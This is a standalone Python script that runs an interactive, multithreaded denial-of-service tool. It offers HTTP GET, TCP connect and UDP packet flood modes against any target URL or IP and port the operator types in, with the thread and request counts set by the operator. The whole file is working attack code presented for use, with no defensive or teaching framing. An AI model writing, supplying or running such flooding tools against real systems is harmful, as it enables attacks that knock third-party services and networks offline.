import requests
import threading
import socket

# HTTP Flood
def http_flood(url, count):
    for i in range(count):
        try:
            r = requests.get(url, timeout=3)
            print(f"[HTTP] {i+1} => {r.status_code}")
        except Exception as e:
            print(f"[HTTP] {i+1} => Error: {e}")

# TCP Flood
def tcp_flood(ip, port, count):
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"TEST_PACKET")
            s.close()
            print(f"[TCP] {i+1} => Sent")
        except Exception as e:
            print(f"[TCP] {i+1} => Error: {e}")

# UDP Flood
def udp_flood(ip, port, count):
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"TEST_PACKET", (ip, port))
            print(f"[UDP] {i+1} => Sent")
        except Exception as e:
            print(f"[UDP] {i+1} => Error: {e}")

def run():
    mode = input("Choose mode (http/tcp/udp): ").strip().lower()

    if mode == "http":
        url = input("Target URL: ").strip()
        threads = int(input("Threads: "))
        per_thread = int(input("Requests per thread: "))

        for t in range(threads):
            th = threading.Thread(target=http_flood, args=(url, per_thread))
            th.start()

    elif mode == "tcp":
        ip = input("Target IP: ").strip()
        port = int(input("Target Port: "))
        threads = int(input("Threads: "))
        per_thread = int(input("Packets per thread: "))

        for t in range(threads):
            th = threading.Thread(target=tcp_flood, args=(ip, port, per_thread))
            th.start()

    elif mode == "udp":
        ip = input("Target IP: ").strip()
        port = int(input("Target Port: "))
        threads = int(input("Threads: "))
        per_thread = int(input("Packets per thread: "))

        for t in range(threads):
            th = threading.Thread(target=udp_flood, args=(ip, port, per_thread))
            th.start()

    else:
        print("Invalid mode. Please type http, tcp, or udp.")

if __name__ == "__main__":
    while True:
        run()
        again = input("Working finished. Do you want to run again? (yes/no): ").strip().lower()
        if again != "yes":
            print("Exiting program...")
            break